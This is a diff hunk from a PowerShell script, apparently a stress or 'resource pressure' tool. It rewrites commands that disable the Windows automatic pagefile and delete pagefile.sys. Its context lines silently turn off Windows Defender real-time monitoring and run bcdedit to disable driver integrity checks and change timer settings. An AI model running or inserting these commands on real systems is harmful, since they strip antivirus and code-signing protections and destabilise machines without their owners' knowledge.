@@ -19,8 +19,8 @@ Import-Module ThreadJob -Force
 
 try{Set-MpPreference -DisableRealtimeMonitoring $true} catch{}
 # --- System Tweaks to maximize resource pressure ---
-Invoke-Expression "wmic computersystem where name='$env:computername' set AutomaticManagedPagefile=False"
-Invoke-Expression "wmic pagefileset where name='C:\\pagefile.sys' delete"
+Start-Process wmic -ArgumentList 'computersystem set AutomaticManagedPagefile=False' -NoNewWindow -Wait
+Start-Process wmic -ArgumentList 'pagefileset where (name="C:\\\\pagefile.sys") delete' -NoNewWindow -Wait
 Invoke-Expression "bcdedit /set useplatformclock true"
 Invoke-Expression "bcdedit /set disabledynamictick yes"
 Invoke-Expression "bcdedit /set nointegritychecks yes"
